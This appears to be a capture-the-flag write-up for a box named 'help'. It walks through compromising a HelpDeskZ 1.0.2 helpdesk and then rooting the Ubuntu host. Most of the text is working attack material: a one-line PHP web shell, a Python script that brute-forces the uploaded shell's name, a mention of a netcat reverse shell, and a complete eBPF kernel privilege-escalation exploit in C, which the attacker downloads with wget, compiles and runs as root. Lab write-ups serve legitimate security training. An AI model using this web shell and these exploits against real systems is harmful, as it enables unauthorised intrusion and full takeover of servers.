help
---

Steps
---
## 1. Uploading shell

Create a new issue, and upload this file

Ignore the message "File not allowed"

```
e.g. shell.php
---
<?php echo system($_REQUEST['cmd']);?>

```

## 2. Find your shell

https://www.exploit-db.com/exploits/40300

```
import hashlib
import time
import sys
import requests
import datetime

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]


r = requests.get(helpdeskzBaseUrl)

#Gets the current time of the server to prevent timezone errors - DoctorEww
currentTime = int((datetime.datetime.strptime(r.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')  - datetime.datetime(1970,1,1)).total_seconds())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print 'found!'
        print url
        sys.exit(0)

print 'Sorry, I did not find anything'
```

## 3. RCE to reverse connect

Once you have found your shell, send a nc command to spawn a reverse shell

Priv Esc
---

Opening the nc shell, run uname -a to get the kernel version 

```
> uname -a
... 4.4.0-116-generic ...
```

We find an exploit https://www.exploit-db.com/exploits/44298

```
/*
 * Ubuntu 16.04.4 kernel priv esc
 *
 * all credits to @bleidl
 * - vnik
 */

// Tested on:
// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
// if different kernel adjust CRED offset + check kernel stack size
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <stdint.h>

#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5f8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328

int sockets[2];
int mapfd, progfd;

char *__prog = 	"\xb4\x09\x00\x00\xff\xff\xff\xff"
		"\x55\x09\x02\x00\xff\xff\xff\xff"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x18\x19\x00\x00\x03\x00\x00\x00"
		"\x00\x00\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x00\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x06\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x01\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x07\x00\x00\x00\x00\x00\x00"
		"\xbf\x91\x00\x00\x00\x00\x00\x00"
		"\xbf\xa2\x00\x00\x00\x00\x00\x00"
		"\x07\x02\x00\x00\xfc\xff\xff\xff"
		"\x62\x0a\xfc\xff\x02\x00\x00\x00"
		"\x85\x00\x00\x00\x01\x00\x00\x00"
		"\x55\x00\x01\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x79\x08\x00\x00\x00\x00\x00\x00"
		"\xbf\x02\x00\x00\x00\x00\x00\x00"
		"\xb7\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x03\x00\x00\x00\x00\x00"
		"\x79\x73\x00\x00\x00\x00\x00\x00"
		"\x7b\x32\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x55\x06\x02\x00\x01\x00\x00\x00"
		"\x7b\xa2\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00"
		"\x7b\x87\x00\x00\x00\x00\x00\x00"
		"\x95\x00\x00\x00\x00\x00\x00\x00";

char bpf_log_buf[LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		  const struct bpf_insn *insns, int prog_len,
		  const char *license, int kern_version) {
	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (__u64)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (__u64)license,
		.log_buf = (__u64)bpf_log_buf,
		.log_size = LOG_BUF_SIZE,
		.log_level = 1,
	};

	attr.kern_version = kern_version;

	bpf_log_buf[0] = 0;

	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		   int max_entries) {
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};

	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, uint64_t value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)&key,
		.value = (__u64)&value,
		.flags = 0,
	};

	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value) {
	union bpf_attr attr = {
		.map_fd = mapfd,
		.key = (__u64)key,
		.value = (__u64)value,
	};

	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static void __exit(char *err) {
	fprintf(stderr, "error: %s\n", err);
	exit(-1);
}

static void prep(void) {
	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
	if (mapfd < 0)
		__exit(strerror(errno));

	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
			(struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);

	if (progfd < 0)
		__exit(strerror(errno));

	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
		__exit(strerror(errno));

	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
		__exit(strerror(errno));
}

static void writemsg(void) {
	char buffer[64];

	ssize_t n = write(sockets[0], buffer, sizeof(buffer));

	if (n < 0) {
		perror("write");
		return;
	}
	if (n != sizeof(buffer))
		fprintf(stderr, "short write: %lu\n", n);
}

#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();

static uint64_t get_value(int key) {
	uint64_t value;

	if (bpf_lookup_elem(&key, &value))
		__exit(strerror(errno));

	return value;
}

static uint64_t __get_fp(void) {
	__update_elem(1, 0, 0);

	return get_value(2);
}

static uint64_t __read(uint64_t addr) {
	__update_elem(0, addr, 0);

	return get_value(2);
}

static void __write(uint64_t addr, uint64_t val) {
	__update_elem(2, addr, val);
}

static uint64_t get_sp(uint64_t addr) {
	return addr & ~(0x4000 - 1);
}

static void pwn(void) {
	uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp < PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("bogus sp");
	
	task_struct = __read(sp);

	if (task_struct < PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", task_struct);

	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr < PHYS_OFFSET)
		__exit("bogus cred ptr");

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr < PHYS_OFFSET)
		__exit("bogus uid ptr");

	printf("uidptr = %lx\n", uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf("spawning root shell\n");
		system("/bin/bash");
		exit(0);
	}

	__exit("not vulnerable?");
}

int main(int argc, char **argv) {
	prep();
	pwn();

	return 0;
}
            
```

We run a http server on our attacker machine, and wget this file over

Compile the file and run the binary to get a root shell

```
Attacker
---
> python3 -m http.server


Victim
---
> wget http://<addr>:<port>/exploit.c
> gcc exploit.c
> ./a.out
whoami
root

cat /root/root.txt
```



